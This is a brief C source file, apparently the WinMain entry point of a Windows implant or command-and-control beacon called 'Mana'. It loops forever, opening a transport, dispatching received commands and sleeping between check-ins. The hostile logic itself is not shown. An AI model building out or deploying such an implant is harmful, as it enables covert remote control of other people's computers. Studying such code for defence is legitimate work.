#include <Mana.h>
#include <Config.h>

#include <Core.h>
#include <Transport.h>
#include <Command.h>

INSTANCE Instance = { 0 };

INT WINAPI WinMain( HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, INT nShowCmd )
{
    ManaInit();
    do
    {
        if ( ! Instance.Session.Connected )
        {
            if ( TransportInit( ) )
                CommandDispatcher();
        }
        
        Sleep( Instance.Config.Sleeping );

    } while ( TRUE );
}